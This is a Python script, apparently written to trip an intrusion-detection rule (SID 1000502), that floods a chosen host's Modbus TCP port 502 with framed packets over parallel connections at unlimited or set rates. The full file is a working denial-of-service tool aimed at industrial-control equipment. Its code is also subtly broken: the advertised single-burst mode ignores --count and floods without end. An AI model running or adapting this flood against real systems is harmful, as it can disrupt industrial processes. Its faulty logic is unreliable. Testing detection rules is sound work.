import socket
import struct
import argparse
import time
import sys
import threading


def build_dummy_payload(size: int) -> bytes:
    trans_id = 0x0001
    protocol_id = 0x0000
    unit_id = 0x01
    length = size + 1
    header = struct.pack("!HHHB", trans_id, protocol_id, length, unit_id)
    body = bytes([0x03]) * size
    return header + body


def flood_worker(host: str, port: int, payload: bytes, connect_timeout: float,
                  worker_id: int, duration: float, rate_per_sec: int,
                  stop_event: threading.Event, results: dict):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(connect_timeout)
    try:
        sock.connect((host, port))
    except Exception as e:
        print(f"[Worker {worker_id}] Connection failed: {e}")
        results[worker_id] = 0
        return

    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

    total_sent = 0
    start_time = time.time()
    window_start = start_time
    window_count = 0

    try:
        while not stop_event.is_set():
            now = time.time()
            elapsed_total = now - start_time

            if duration > 0 and elapsed_total >= duration:
                break

            if rate_per_sec > 0:
                window_elapsed = now - window_start
                if window_elapsed >= 1.0:
                    window_start = now
                    window_count = 0

                if window_count >= rate_per_sec:
                    sleep_time = 1.0 - (now - window_start)
                    if sleep_time > 0:
                        time.sleep(sleep_time)
                    window_start = time.time()
                    window_count = 0
                    continue

            sock.sendall(payload)
            total_sent += 1
            window_count += 1

    except Exception as e:
        print(f"[Worker {worker_id}] Send failed after {total_sent} packets: {e}")

    elapsed = time.time() - start_time
    rate = total_sent / elapsed if elapsed > 0 else 0
    print(f"[Worker {worker_id}] Sent {total_sent} packets in {elapsed:.2f} sec "
          f"({rate:.1f} pkts/sec)")

    results[worker_id] = total_sent

    try:
        sock.close()
    except Exception:
        pass


def main():
    parser = argparse.ArgumentParser(
        description="Trigger SID 1000502 (Modbus TCP/502 high-rate payload flood)"
    )
    parser.add_argument("--host", required=True, help="Target IP address")
    parser.add_argument("--port", type=int, default=502, help="Target port, default 502")
    parser.add_argument("--duration", type=float, default=0,
                         help="Total duration in seconds to keep flooding. "
                              "0 means send a single burst using --count instead")
    parser.add_argument("--count", type=int, default=150,
                         help="Number of packets to send (only used when --duration is 0), default 150")
    parser.add_argument("--rate", type=int, default=0,
                         help="Target packets per second per connection during --duration mode. "
                              "0 means unlimited (send as fast as possible), default 0")
    parser.add_argument("--payload-size", type=int, default=1,
                         help="Payload body size in bytes (before MBAP header), default 1")
    parser.add_argument("--connections", type=int, default=1,
                         help="Number of parallel TCP connections (same source IP), default 1")
    parser.add_argument("--connect-timeout", type=float, default=2.0,
                         help="TCP connect/send timeout in seconds, default 2.0")
    args = parser.parse_args()

    if args.duration < 0:
        print("[Error] --duration cannot be negative")
        sys.exit(1)

    payload = build_dummy_payload(args.payload_size)

    print(f"[Info] Target: {args.host}:{args.port}")
    print(f"[Info] Payload size per packet: {len(payload)} bytes")
    print(f"[Info] Parallel connections: {args.connections}")

    if args.duration > 0:
        print(f"[Info] Mode: continuous flood for {args.duration} sec")
        if args.rate > 0:
            print(f"[Info] Rate limit per connection: {args.rate} pkts/sec")
        else:
            print("[Info] Rate limit: unlimited (max speed)")
    else:
        print(f"[Info] Mode: single burst, {args.count} packets per connection")

    results = {}
    threads = []
    stop_event = threading.Event()

    overall_start = time.time()

    if args.duration > 0:
        for i in range(args.connections):
            t = threading.Thread(
                target=flood_worker,
                args=(args.host, args.port, payload, args.connect_timeout,
                      i + 1, args.duration, args.rate, stop_event, results)
            )
            threads.append(t)
            t.start()

        try:
            for t in threads:
                t.join()
        except KeyboardInterrupt:
            print("\n[Info] Interrupted by user, stopping workers...")
            stop_event.set()
            for t in threads:
                t.join()
    else:
        for i in range(args.connections):
            t = threading.Thread(
                target=flood_worker,
                args=(args.host, args.port, payload, args.connect_timeout,
                      i + 1, 0, 0, stop_event, results)
            )
            threads.append(t)
            t.start()

        def burst_stopper():
            time.sleep(0.01)

        for t in threads:
            t.join()

    overall_elapsed = time.time() - overall_start
    total_sent = sum(results.values())

    print("-" * 60)
    print(f"[Summary] Total packets sent: {total_sent}")
    print(f"[Summary] Total elapsed time: {overall_elapsed:.2f} sec")
    if overall_elapsed > 0:
        print(f"[Summary] Overall average rate: {total_sent / overall_elapsed:.1f} pkts/sec")


if __name__ == "__main__":
    main()
